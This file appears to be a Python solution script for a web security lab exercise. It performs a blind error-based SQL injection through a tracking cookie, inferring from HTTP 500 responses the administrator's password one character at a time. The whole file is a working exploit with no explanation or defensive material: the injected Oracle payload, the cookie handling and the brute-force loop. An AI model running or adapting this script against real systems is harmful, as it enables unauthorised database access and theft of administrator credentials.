import requests

URL = "CHANGE_ME"
SESSION_COOKIE = "CHANGE_ME"
TRACKING_ID = "CHANGE_ME"
PASSWORD_LENGTH = 20
CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"

def check_char(position, char):
    payload = (f"{TRACKING_ID}' AND (SELECT CASE WHEN (SUBSTR(password,{position},1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a")
    cookies = {"TrackingId": payload, "session": SESSION_COOKIE}
    response = requests.get(URL, cookies=cookies)
    return response.status_code == 500

def extract_password():
    password = ""
    for position in range(1, PASSWORD_LENGTH + 1):
        for char in CHARS:
            print(f"[*] Position {position}: trying '{char}'", end="\r")
            if check_char(position, char):
                password += char
                print(f"[+] Position {position}: '{char}' ✓")
                break
    return password

if __name__ == "__main__":
    password = extract_password()
    print(f"\n[+] Password: {password}")
